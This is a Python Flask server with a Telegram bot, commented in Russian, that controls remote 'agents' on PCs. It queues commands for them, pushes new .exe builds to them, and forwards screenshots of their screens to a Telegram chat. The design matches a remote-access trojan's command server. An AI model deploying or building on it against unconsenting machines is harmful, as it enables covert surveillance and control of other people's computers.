import os
import time
import threading
from flask import Flask, request, jsonify, send_file
import telebot

# Инициализация Flask приложения
app = Flask(__name__)

# Токен твоего Telegram бота
TOKEN = "СЮДА_ТОКЕН_ТВОЕГО_БОТА"
bot = telebot.TeleBot(TOKEN)

# === НАСТРОЙКИ ОБНОВЛЕНИЯ И АДМИНИСТРИРОВАНИЯ ===
ADMIN_ID = 123456789  # <=== ВСТАВЬ СЮДА СВОЙ TELEGRAM ID
UPDATE_FILE_PATH = "latest_update.exe"
current_update_version = 0  # Счётчик версий
# ===============================================

# Хранилище команд и состояний хостов
hosts_data = {}

# Вспомогательная функция для удаления отчетов через 5 секунд в фоне
def send_and_delete_msg(chat_id, text, delay=5):
    try:
        msg = bot.send_message(chat_id, text)
        def delayed_delete():
            time.sleep(delay)
            try:
                bot.delete_message(chat_id, msg.message_id)
            except:
                pass
        threading.Thread(target=delayed_delete, daemon=True).start()
    except Exception as e:
        print(f"Ошибка отправки/удаления сообщения: {e}")

# Обработчик загрузки обновления (разрешено только для ADMIN_ID)
@bot.message_handler(content_types=['document'])
def handle_update_document(message):
    global current_update_version
    if message.from_user.id != ADMIN_ID:
        return  # Обычные пользователи не могут обновлять агентов
    
    if message.document.file_name.endswith('.exe'):
        bot.send_message(message.chat.id, "🔄 Скачиваю файл обновления на сервер...")
        try:
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            
            with open(UPDATE_FILE_PATH, 'wb') as new_file:
                new_file.write(downloaded_file)
            
            current_update_version += 1
            bot.send_message(
                message.chat.id, 
                f"✅ Обновление успешно зарегистрировано!\nАктуальная версия теперь: v{current_update_version}\nВсе подключенные агенты обновятся автоматически."
            )
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Ошибка во время сохранения обновления: {e}")

# API эндпоинт для скачивания файла обновления агентами
@app.route('/get_update', methods=['GET'])
def get_update():
    if os.path.exists(UPDATE_FILE_PATH):
        return send_file(UPDATE_FILE_PATH, as_attachment=True, download_name="RemoteAgent_new.exe")
    return "No update file found", 404

# Полпинг запросы от клиентов
@app.route('/poll', methods=['POST'])
def poll():
    global current_update_version
    payload = request.json
    if not payload:
        return jsonify({"commands": [], "update_version": current_update_version}), 400
        
    host_id = payload.get("host_id")
    user_id = payload.get("user_id")
    status = payload.get("status")
    current_dir = payload.get("current_dir")
    items = payload.get("items", [])
    report = payload.get("report", "")

    if not host_id or not user_id:
        return jsonify({"commands": [], "update_version": current_update_version}), 400

    # Обновляем инфо о хосте
    hosts_data[host_id] = {
        "user_id": user_id,
        "status": status,
        "current_dir": current_dir,
        "items": items,
        "last_seen": time.time()
    }

    # Если агент прислал отчет о выполнении команды
    if report:
        if report.startswith("SUCCESS:"):
            msg_text = f"✅ Успешно: {report.split(':', 1)[1]}"
            send_and_delete_msg(user_id, msg_text, delay=5)  # Удаление отчета через 5 сек
        elif report.startswith("ERROR:"):
            # Ошибки не удаляем автоматически, чтобы ты их гарантированно увидел
            bot.send_message(user_id, f"❌ Ошибка: {report.split(':', 1)[1]}")

    # Извлекаем и возвращаем команды, подготовленные для этого агента
    commands = hosts_data[host_id].get("pending_commands", [])
    hosts_data[host_id]["pending_commands"] = []

    return jsonify({
        "commands": commands, 
        "update_version": current_update_version  # Передаем актуальную версию агенту
    })

# Загрузка скриншота на сервер
@app.route('/upload_screenshot', methods=['POST'])
def upload_screenshot():
    host_id = request.args.get("host_id")
    user_id = request.args.get("user_id")
    if not host_id or not user_id:
        return "Missing parameters", 400
        
    try:
        photo_data = request.data
        # Временный сейв скриншота
        filename = f"temp_{host_id}.jpg"
        with open(filename, "wb") as f:
            f.write(photo_data)
            
        # Отправляем в телеграм
        with open(filename, "rb") as f:
            bot.send_photo(user_id, f, caption="📸 Скриншот экрана ПК ✅")
            
        os.remove(filename)
        return "OK"
    except Exception as e:
        return str(e), 500

# Телеграм вебхук или запуск пулинга бота в отдельном потоке
def run_tg_polling():
    while True:
        try:
            bot.polling(none_stop=True, interval=0)
        except Exception as e:
            time.sleep(3)

if __name__ == "__main__":
    # Запускаем бота параллельно с Flask-сервером
    threading.Thread(target=run_tg_polling, daemon=True).start()
    
    # Порт для Render
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
